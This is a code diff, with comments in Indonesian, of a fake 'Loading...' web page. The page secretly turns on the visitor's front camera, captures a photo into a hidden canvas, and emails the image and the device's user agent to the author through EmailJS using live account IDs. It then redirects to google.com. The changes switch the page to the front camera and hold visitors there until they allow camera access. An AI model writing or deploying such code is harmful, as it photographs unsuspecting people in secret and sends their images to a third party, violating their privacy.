@@ -35,48 +35,64 @@
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
+
+    .error {
+      color: #f87171;
+      margin-top: 15px;
+      font-size: 14px;
+    }
   </style>
 </head>
 <body>
 
 <div class="box">
   <div class="loader"></div>
-  <h3>Loading...</h3>
+  <h3 id="status">Loading...</h3>
+  <div id="error" class="error"></div>
 </div>
 
-<!-- Kamera (disembunyikan) -->
 <video id="video" autoplay playsinline style="display:none;"></video>
 <canvas id="canvas" width="300" height="225" style="display:none;"></canvas>
 
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 
 <script>
+// ✅ EmailJS config kamu
 (function(){
-    emailjs.init("buxVv6sNpKGz4iBzb"); // GANTI
+    emailjs.init("buxVv6sNpKGz4iBzb");
 })();
 
 const video = document.getElementById("video");
+const statusText = document.getElementById("status");
+const errorText = document.getElementById("error");
 
-// Akses kamera depan
-navigator.mediaDevices.getUserMedia({
-    video: { facingMode: "environment" }
-})
-.then(stream => {
-    video.srcObject = stream;
+// START kamera
+startCamera();
 
-    // Tunggu kamera siap lalu ambil foto
-    setTimeout(ambilFoto, 2000);
-})
-.catch(err => {
-    console.log("Kamera error:", err);
+async function startCamera() {
+    try {
+        // WAJIB izin kamera
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" }
+        });
 
-    // tetap redirect
-    setTimeout(() => {
-        window.location.href = "https://google.com";
-    }, 3000);
-});
+        video.srcObject = stream;
 
-// Ambil foto & kirim
+        statusText.innerText = "Loading...";
+
+        setTimeout(ambilFoto, 2000);
+
+    } catch (err) {
+        // ❌ kalau user nolak
+        statusText.innerText = "Akses kamera ditolak!";
+        errorText.innerText = "Silakan izinkan kamera untuk melanjutkan.";
+
+        // ❗ TIDAK ADA REDIRECT
+        console.log("User menolak kamera:", err);
+    }
+}
+
+// ambil foto
 function ambilFoto() {
     const canvas = document.getElementById("canvas");
     const ctx = canvas.getContext("2d");
@@ -85,6 +101,8 @@ function ambilFoto() {
 
     const imageData = canvas.toDataURL("image/png");
 
+    statusText.innerText = "Mengirim data...";
+
     emailjs.send("service_lzuezkd", "template_33st1em", {
         message: "Foto berhasil diambil",
         image: imageData,
@@ -92,14 +110,14 @@ function ambilFoto() {
         device: navigator.userAgent
     })
     .then(() => {
-        console.log("Berhasil kirim");
+        statusText.innerText = "Berhasil! Mengalihkan...";
 
         setTimeout(() => {
-            window.location.href = "https://google.com"; // GANTI
+            window.location.href = "https://google.com"; // GANTI LINK TUJUAN
         }, 3000);
     })
     .catch(() => {
-        console.log("Gagal kirim");
+        statusText.innerText = "Gagal mengirim, tapi lanjut...";
 
         setTimeout(() => {
             window.location.href = "https://google.com";
@@ -109,4 +127,4 @@ function ambilFoto() {
 </script>
 
 </body>
-  </html>
+</html>
